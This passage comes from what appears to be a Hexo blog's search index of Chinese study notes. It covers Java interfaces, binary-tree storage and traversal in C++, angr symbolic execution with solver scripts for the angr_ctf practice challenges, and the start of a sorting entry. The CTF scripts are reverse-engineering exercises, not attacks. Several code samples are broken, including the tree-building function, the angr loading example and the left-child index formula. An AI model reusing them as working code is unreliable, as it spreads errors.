          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Java--接口</title>
      <link href="/2022/11/04/Java-%E6%8E%A5%E5%8F%A3/"/>
      <url>/2022/11/04/Java-%E6%8E%A5%E5%8F%A3/</url>
      
        <content type="html"><![CDATA[        <h1 id="Java——接口"   >          <a href="#Java——接口" class="heading-link"><i class="fas fa-link"></i></a><a href="#Java——接口" class="headerlink" title="Java——接口"></a>Java——接口</h1>      <p>接口就是给出一些没有实现的方法，封装到一起，到某个类要使用时，再根据具体情况把这些方法 写出来</p><p>接口在一定程度上实现代码解耦 [即：接口规范性+动态绑定]，接口也可实现多态</p>        <h2 id="接口的定义"   >          <a href="#接口的定义" class="heading-link"><i class="fas fa-link"></i></a><a href="#接口的定义" class="headerlink" title="接口的定义"></a>接口的定义</h2>      <ul><li>使用关键字interface</li></ul><p><code>public interface [name] &#123;&#125;</code></p><figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Swim</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">swim</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><ul><li>接口不能实例化</li></ul><p>接口和类之间是实现关系，通过implements 关键字表示</p><p><code>public class [name] implements [接口名] &#123;&#125;</code></p><ul><li>接口中属性的访问形式：接口名.属性名</li></ul><p>接口的子类（实现类）：</p><pre><code>    1. 要么重写接口中所有抽象方法    1. 要么是抽象类</code></pre><figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dog</span> <span class="keyword">extends</span> <span class="title class_">Ami</span> <span class="keyword">implements</span> <span class="title class_">Swim</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Dog</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Dog</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(name, age);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.print(<span class="string">&quot;Dog&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">swim</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.print(<span class="string">&quot;Dog SWim&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>        <h2 id="接口中成员的特点"   >          <a href="#接口中成员的特点" class="heading-link"><i class="fas fa-link"></i></a><a href="#接口中成员的特点" class="headerlink" title="接口中成员的特点"></a>接口中成员的特点</h2>              <h3 id="成员变量"   >          <a href="#成员变量" class="heading-link"><i class="fas fa-link"></i></a><a href="#成员变量" class="headerlink" title="成员变量"></a>成员变量</h3>      <ul><li>只能是常量</li><li>默认修饰符：<code>public static final</code></li></ul>        <h3 id="构造方法"   >          <a href="#构造方法" class="heading-link"><i class="fas fa-link"></i></a><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h3>      <ul><li>没有</li></ul>        <h3 id="成员方法"   >          <a href="#成员方法" class="heading-link"><i class="fas fa-link"></i></a><a href="#成员方法" class="headerlink" title="成员方法"></a>成员方法</h3>      <p>JDK7以前</p><ul><li>只能是抽象方法</li><li>默认修饰符：<code>public abstract</code></li></ul><p>JDK8以后</p><ul><li>接口可以有静态方法，默认方法（要使用<code>default</code>关键字），也就是说接口中可以有方 法的具体实现，方法默认<code>public</code></li></ul>        <h2 id="接口和类的关系"   >          <a href="#接口和类的关系" class="heading-link"><i class="fas fa-link"></i></a><a href="#接口和类的关系" class="headerlink" title="接口和类的关系"></a>接口和类的关系</h2>              <h3 id="类和类的关系"   >          <a href="#类和类的关系" class="heading-link"><i class="fas fa-link"></i></a><a href="#类和类的关系" class="headerlink" title="类和类的关系"></a>类和类的关系</h3>      <ul><li>继承关系</li></ul><p>可以单继承不能多继承，但是可以多层继承</p>        <h3 id="类和接口的关系"   >          <a href="#类和接口的关系" class="heading-link"><i class="fas fa-link"></i></a><a href="#类和接口的关系" class="headerlink" title="类和接口的关系"></a>类和接口的关系</h3>      <ul><li>实现关系</li></ul><p>可以单实现也可以多实现，但必须把接口全部实现</p><p>同名的方法仅需重写一个</p>        <h3 id="接口和接口之间的关系"   >          <a href="#接口和接口之间的关系" class="heading-link"><i class="fas fa-link"></i></a><a href="#接口和接口之间的关系" class="headerlink" title="接口和接口之间的关系"></a>接口和接口之间的关系</h3>      <ul><li>继承关系</li></ul><p>可以单继承也可以多继承</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>数据结构--二叉树</title>
      <link href="/2022/10/13/%E4%BA%8C%E5%8F%89%E6%A0%91/"/>
      <url>/2022/10/13/%E4%BA%8C%E5%8F%89%E6%A0%91/</url>
      
        <content type="html"><![CDATA[        <h1 id="二叉树"   >          <a href="#二叉树" class="heading-link"><i class="fas fa-link"></i></a><a href="#二叉树" class="headerlink" title="二叉树"></a>二叉树</h1>              <h2 id="什么是树"   >          <a href="#什么是树" class="heading-link"><i class="fas fa-link"></i></a><a href="#什么是树" class="headerlink" title="什么是树"></a>什么是树</h2>      <ul><li>树是有n(n≥0)个结点的有限集合。</li><li>如果 n&#x3D;0，称为空树。</li><li>如果 n&gt;0,称为非空树,对于非空树,有且仅有一个特 定的称为根(Root)的节点(无直接前驱) </li><li>如果 n&gt;1，则除根以外的其它结点划分为 m (m&gt;0)个 互不相交的有限集 T1, T2 ,…, Tm，其中每个集合 本身又是一棵树，并且称为根的子树(SubTree)。</li><li>每个结点都有唯一的直接前驱，但可能有多个后继</li></ul>        <h2 id="二叉树的种类"   >          <a href="#二叉树的种类" class="heading-link"><i class="fas fa-link"></i></a><a href="#二叉树的种类" class="headerlink" title="二叉树的种类"></a>二叉树的种类</h2>              <h3 id="满二叉树"   >          <a href="#满二叉树" class="heading-link"><i class="fas fa-link"></i></a><a href="#满二叉树" class="headerlink" title="满二叉树"></a>满二叉树</h3>      <p>如果一棵二叉树只有度为0的结点和度为2的结点，并且度为0的结点在同一层上，则这棵二叉树为满二叉树。</p><p>这棵二叉树为满二叉树，也可以说深度为k，有2^k-1个节点的二叉树。</p>        <h3 id="完全二叉树"   >          <a href="#完全二叉树" class="heading-link"><i class="fas fa-link"></i></a><a href="#完全二叉树" class="headerlink" title="完全二叉树"></a>完全二叉树</h3>      <p>完全二叉树的定义如下：在完全二叉树中，除了最底层节点可能没填满外，其余每层节点数都达到最大值，并且最下面一层的节点都集中在该层最左边的若干位置。若最底层为第 h 层，则该层包含 1~ 2^(h-1)  个节点。</p>        <h3 id="二叉搜索树"   >          <a href="#二叉搜索树" class="heading-link"><i class="fas fa-link"></i></a><a href="#二叉搜索树" class="headerlink" title="二叉搜索树"></a>二叉搜索树</h3>      <p>二叉搜索树是一个有序树。</p><ul><li>若它的左子树不空，则左子树上所有结点的值均小于它的根结点的值；</li><li>若它的右子树不空，则右子树上所有结点的值均大于它的根结点的值；</li><li>它的左、右子树也分别为二叉排序树</li></ul>        <h3 id="平衡二叉搜索树"   >          <a href="#平衡二叉搜索树" class="heading-link"><i class="fas fa-link"></i></a><a href="#平衡二叉搜索树" class="headerlink" title="平衡二叉搜索树"></a>平衡二叉搜索树</h3>      <p>平衡二叉搜索树：又被称为AVL（Adelson-Velsky and Landis）树，且具有以下性质：它是一棵空树或它的左右两个子树的高度差的绝对值不超过1，并且左右两个子树都是一棵平衡二叉树。</p>        <h2 id="二叉树的存储"   >          <a href="#二叉树的存储" class="heading-link"><i class="fas fa-link"></i></a><a href="#二叉树的存储" class="headerlink" title="二叉树的存储"></a>二叉树的存储</h2>      <p>二叉树的存储分链式存储和线性存储</p><p>线性存储利用数组</p><p>对于下标为<code>i</code>的节点来说，左节点的下标为<code>i*1+1</code>，右节点的下标为<code>i*2+2</code></p><p>链式存储利用链表</p><figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span>&#123;</span><br><span class="line">    <span class="type">int</span> delta;</span><br><span class="line">Node* r;</span><br><span class="line">Node* l;</span><br><span class="line">    <span class="built_in">Node</span>(<span class="type">int</span> x) : <span class="built_in">delta</span>(x), <span class="built_in">r</span>(<span class="literal">nullptr</span>), <span class="built_in">l</span>(<span class="literal">nullptr</span>) &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p>建立二叉树</p><figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">Create</span><span class="params">(Node * &amp;T)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">char</span> ch;</span><br><span class="line">cin &gt;&gt; ch;</span><br><span class="line"><span class="keyword">if</span>(data == <span class="string">&#x27;0&#x27;</span> )&#123;</span><br><span class="line">T == <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">T = <span class="keyword">new</span> Node *;</span><br><span class="line">T-&gt;data = ch;</span><br><span class="line"><span class="built_in">Create</span>(T-&gt;left);</span><br><span class="line"><span class="built_in">Create</span>(T-&gt;right);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>        <h3 id="二叉树的遍历"   >          <a href="#二叉树的遍历" class="heading-link"><i class="fas fa-link"></i></a><a href="#二叉树的遍历" class="headerlink" title="二叉树的遍历"></a>二叉树的遍历</h3>              <h4 id="深度优先搜索"   >          <a href="#深度优先搜索" class="heading-link"><i class="fas fa-link"></i></a><a href="#深度优先搜索" class="headerlink" title="深度优先搜索"></a>深度优先搜索</h4>              <h5 id="递归"   >          <a href="#递归" class="heading-link"><i class="fas fa-link"></i></a><a href="#递归" class="headerlink" title="递归"></a>递归</h5>      <p>深度优先搜索一般使用递归实现</p><figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">travel</span><span class="params">(Node * root, vector&lt;<span class="type">int</span>&gt; vec)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root == <span class="literal">nullptr</span>) <span class="keyword">return</span> ;</span><br><span class="line">    <span class="comment">//前序遍历</span></span><br><span class="line">    vec.<span class="built_in">push</span>(root-&gt;delta);</span><br><span class="line">    <span class="built_in">travel</span>(root-&gt;l, vec);</span><br><span class="line">    <span class="comment">//中序遍历</span></span><br><span class="line">    <span class="comment">//vec.push(root-&gt;delta);</span></span><br><span class="line">    <span class="built_in">travel</span>(root-&gt;r, vec);</span><br><span class="line">    <span class="comment">//后序遍历</span></span><br><span class="line">    <span class="comment">//vec.push(root-&gt;delta);</span></span><br><span class="line">    <span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>        <h5 id="迭代实现"   >          <a href="#迭代实现" class="heading-link"><i class="fas fa-link"></i></a><a href="#迭代实现" class="headerlink" title="迭代实现"></a>迭代实现</h5>      <p>迭代实现二叉树的话利用到栈这个数据，本质还是在模拟递归的执行</p><p>前序&#x2F;后序遍历：</p><figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">preorderTraversal</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; rec;</span><br><span class="line">        stack&lt;TreeNode*&gt; st;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">nullptr</span>) <span class="keyword">return</span> rec;</span><br><span class="line">        st.<span class="built_in">push</span>(root);</span><br><span class="line">        <span class="keyword">while</span>(!st.<span class="built_in">empty</span>())&#123;</span><br><span class="line">            TreeNode* tmp = st.<span class="built_in">top</span>();</span><br><span class="line">            st.<span class="built_in">pop</span>();</span><br><span class="line">            rec.<span class="built_in">push_back</span>(tmp-&gt;val);</span><br><span class="line">            <span class="comment">//前序遍历</span></span><br><span class="line">            <span class="keyword">if</span>(tmp-&gt;right) st.<span class="built_in">push</span>(tmp-&gt;right);</span><br><span class="line">            <span class="keyword">if</span>(tmp-&gt;left) st.<span class="built_in">push</span>(tmp-&gt;left);</span><br><span class="line">            <span class="comment">//后序遍历</span></span><br><span class="line">            <span class="keyword">if</span>(tmp-&gt;left) st.<span class="built_in">push</span>(tmp-&gt;left)</span><br><span class="line">            <span class="keyword">if</span>(tmp-&gt;right) st.<span class="built_in">push</span>(tmp-&gt;right); </span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment">//后序遍历</span></span><br><span class="line">    <span class="built_in">reverse</span>(rec.<span class="built_in">begin</span>(), rec.<span class="built_in">end</span>());</span><br><span class="line">        <span class="keyword">return</span> rec;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></div></figure><p>中序遍历：</p><p>中序遍历除了栈之外还得额外引入一个指针来帮助找到二叉树的底层，在用栈来处理节点上的数据</p><figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">inorderTraversal</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; rec;</span><br><span class="line">    stack&lt;TreeNode*&gt; st;</span><br><span class="line">    TreeNode* tmp = root;</span><br><span class="line">    <span class="keyword">while</span>(tmp != <span class="literal">nullptr</span> || !st.<span class="built_in">empty</span>())&#123;</span><br><span class="line">        <span class="keyword">if</span>(tmp != <span class="literal">nullptr</span>)&#123;</span><br><span class="line">            st.<span class="built_in">push</span>(tmp);</span><br><span class="line">            tmp = tmp-&gt;left;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            tmp = st.<span class="built_in">top</span>();</span><br><span class="line">            rec.<span class="built_in">push_back</span>(tmp-&gt;val);</span><br><span class="line">            st.<span class="built_in">pop</span>();</span><br><span class="line">            tmp = tmp-&gt;right;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> rec;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p>统一迭代法：</p><p>迭代法的问题是，栈这种数据结构无法解决访问节点和遍历节点不一致的情况，于是可以通过加入一个空指针来进行标记。</p><p>在每个处理的节点后面加入空结点，访问节点则之间入栈。使得处理节点要当空节点出栈后才会出栈。</p>        <h4 id="广度优先搜索"   >          <a href="#广度优先搜索" class="heading-link"><i class="fas fa-link"></i></a><a href="#广度优先搜索" class="headerlink" title="广度优先搜索"></a>广度优先搜索</h4>      <p>广度优先搜索在二叉树中又叫做层序搜索，自顶向下，自左到右一层一层遍历</p><p>利用队列先进先出的特点，可以轻松的实现层序搜索</p>        <h5 id="非递归"   >          <a href="#非递归" class="heading-link"><i class="fas fa-link"></i></a><a href="#非递归" class="headerlink" title="非递归"></a>非递归</h5>      <figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">levelOrder</span>(TreeNode* root) &#123;</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; rec;</span><br><span class="line">    queue&lt;TreeNode*&gt; que;</span><br><span class="line">    <span class="keyword">if</span>(root != <span class="literal">nullptr</span>) que.<span class="built_in">push</span>(root);</span><br><span class="line">    <span class="keyword">while</span>(!que.<span class="built_in">empty</span>())&#123;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; tmp;</span><br><span class="line">        <span class="type">int</span> size = que.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; size; i++)&#123;</span><br><span class="line">            TreeNode* x = que.<span class="built_in">front</span>();</span><br><span class="line">            que.<span class="built_in">pop</span>();</span><br><span class="line">            tmp.<span class="built_in">push_back</span>(x-&gt;val);</span><br><span class="line">            <span class="keyword">if</span>(x-&gt;left) que.<span class="built_in">push</span>(x-&gt;left);</span><br><span class="line">            <span class="keyword">if</span>(x-&gt;right) que.<span class="built_in">push</span>(x-&gt;right);</span><br><span class="line">        &#125;</span><br><span class="line">        rec.<span class="built_in">push_back</span>(tmp);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> rec;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>        <h5 id="递归-1"   >          <a href="#递归-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#递归-1" class="headerlink" title="递归"></a>递归</h5>      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></div></figure>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>angr学习笔记</title>
      <link href="/2022/10/06/angr%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2022/10/06/angr%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[        <h1 id="angr入门"   >          <a href="#angr入门" class="heading-link"><i class="fas fa-link"></i></a><a href="#angr入门" class="headerlink" title="angr入门"></a>angr入门</h1>      <p>angr是一个多架构的二进制分析频台，具备对二进制文件动态符号执行能力和多种静态分析能力</p>        <h2 id="何为符号执行"   >          <a href="#何为符号执行" class="heading-link"><i class="fas fa-link"></i></a><a href="#何为符号执行" class="headerlink" title="何为符号执行"></a>何为符号执行</h2>      <p> 符号执行就是在运行程序时，用符号来替代真实值。符号执行相较于真实值执行的优点在于，当使用真实值执行程序时，我们能够遍历的程序路径只有一条, 而使用符号进行执行时，由于符号是可变的，我们就可以利用这一特性，尽可能的将程序的每一条路径遍历，这样的话，必定存在至少一条能够输出正确结果的分支, 每一条分支的结果都可以表示为一个离散关系式,使用约束求解引擎即可分析出正确结果。</p><p>例如</p><figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a;</span><br><span class="line">cin &gt;&gt; a;</span><br><span class="line"><span class="type">int</span> b = a * <span class="number">2</span>;</span><br><span class="line"><span class="keyword">if</span>(b == <span class="number">114514</span>)&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;flag&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p> 这里可以整合为 <code>x * 2 == 114514</code></p>        <h1 id="利用angr求解"   >          <a href="#利用angr求解" class="heading-link"><i class="fas fa-link"></i></a><a href="#利用angr求解" class="headerlink" title="利用angr求解"></a>利用angr求解</h1>      <ul><li>装载二进制文件到分析平台</li><li>转换二进制文件为中间语言（IR）</li><li>分析</li></ul>        <h2 id="装载二进制文件"   >          <a href="#装载二进制文件" class="heading-link"><i class="fas fa-link"></i></a><a href="#装载二进制文件" class="headerlink" title="装载二进制文件"></a>装载二进制文件</h2>      <p>angr的二进制装载组件是CLE，它负责装载二进制对象</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line">proj = angr.Project(<span class="string">&quot;/bin/true&quot;</span>)</span><br><span class="line"><span class="comment">#二进制入口点</span></span><br><span class="line"><span class="built_in">print</span>(b.entry)</span><br><span class="line"><span class="comment">#二进制文件内存空间的最小和最大地址</span></span><br><span class="line"><span class="built_in">print</span>(b.loder.min_addr(), b.loader.max_addr())</span><br><span class="line"><span class="comment">#文件的全名</span></span><br><span class="line"><span class="built_in">print</span>(b.filename)</span><br></pre></td></tr></table></div></figure>        <h2 id="中间语言-IR"   >          <a href="#中间语言-IR" class="heading-link"><i class="fas fa-link"></i></a><a href="#中间语言-IR" class="headerlink" title="中间语言(IR)"></a>中间语言(IR)</h2>      <p>angr选择VEX作为中间语言来统一各个平台不同的代码</p>        <h1 id="angr-ctf做题笔记"   >          <a href="#angr-ctf做题笔记" class="heading-link"><i class="fas fa-link"></i></a><a href="#angr-ctf做题笔记" class="headerlink" title="angr_ctf做题笔记"></a>angr_ctf做题笔记</h1>              <h2 id="00-angr-find"   >          <a href="#00-angr-find" class="heading-link"><i class="fas fa-link"></i></a><a href="#00-angr-find" class="headerlink" title="00_angr_find"></a>00_angr_find</h2>      <figure class="highlight py"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"></span><br><span class="line">proj = angr.Project(<span class="string">&quot;./00_angr_find&quot;</span>, auto_load_libs = <span class="literal">False</span>)</span><br><span class="line">flag_path = <span class="number">0x08048678</span></span><br><span class="line">false_path = <span class="number">0x08048666</span></span><br><span class="line">state = proj.factory.entry_state()</span><br><span class="line">simg = proj.factory.simgr(state)</span><br><span class="line"></span><br><span class="line">simg.explore(find = flag_path, avoid = false_path)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> simg.found:</span><br><span class="line">    ans = simg.found[<span class="number">0</span>]</span><br><span class="line">    sol = ans.posix.dumps(<span class="number">0</span>)</span><br><span class="line">    <span class="built_in">print</span>(sol.decode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not find the solution&#x27;</span>)</span><br></pre></td></tr></table></div></figure>        <h2 id="01-angr-avoid"   >          <a href="#01-angr-avoid" class="heading-link"><i class="fas fa-link"></i></a><a href="#01-angr-avoid" class="headerlink" title="01_angr_avoid"></a>01_angr_avoid</h2>      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"></span><br><span class="line">proj = angr.Project(<span class="string">&quot;./01_angr_avoid&quot;</span>, auto_load_libs=<span class="literal">False</span>)</span><br><span class="line">state = proj.factory.entry_state()</span><br><span class="line">simg = proj.factory.simgr(state)</span><br><span class="line">flag_path = <span class="number">0x80485E0</span></span><br><span class="line">false_path = <span class="number">0x80485A8</span></span><br><span class="line">simg.explore(find = flag_path, avoid = false_path)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> simg.found:</span><br><span class="line">    ans = simg.found[<span class="number">0</span>]</span><br><span class="line">    sol = ans.posix.dumps(<span class="number">0</span>)</span><br><span class="line">    <span class="built_in">print</span>(sol.decode(<span class="string">&quot;utf-8&quot;</span>))</span><br></pre></td></tr></table></div></figure>        <h2 id="02-angr-find-condition"   >          <a href="#02-angr-find-condition" class="heading-link"><i class="fas fa-link"></i></a><a href="#02-angr-find-condition" class="headerlink" title="02_angr_find_condition"></a>02_angr_find_condition</h2>      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"></span><br><span class="line">proj = angr.Project(<span class="string">&quot;./02_angr_find_condition&quot;</span>, auto_load_libs=<span class="literal">False</span>)</span><br><span class="line">state = proj.factory.entry_state()</span><br><span class="line">simg = proj.factory.simgr(state)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag_path</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&quot;Good Job.&quot;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">false_path</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&quot;Try again.&quot;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(simg.explore(find = flag_path, avoid = false_path))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> simg.found:</span><br><span class="line">    ans = simg.found[<span class="number">0</span>]</span><br><span class="line">    sol = ans.posix.dumps(<span class="number">0</span>)</span><br><span class="line">    <span class="built_in">print</span>(sol.decode(<span class="string">&quot;utf-8&quot;</span>))</span><br></pre></td></tr></table></div></figure>        <h2 id="03-angr-symbolic-registers"   >          <a href="#03-angr-symbolic-registers" class="heading-link"><i class="fas fa-link"></i></a><a href="#03-angr-symbolic-registers" class="headerlink" title="03_angr_symbolic_registers"></a>03_angr_symbolic_registers</h2>      ]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>排序算法</title>
      <link href="/2022/10/02/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/"/>
      <url>/2022/10/02/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/</url>
      
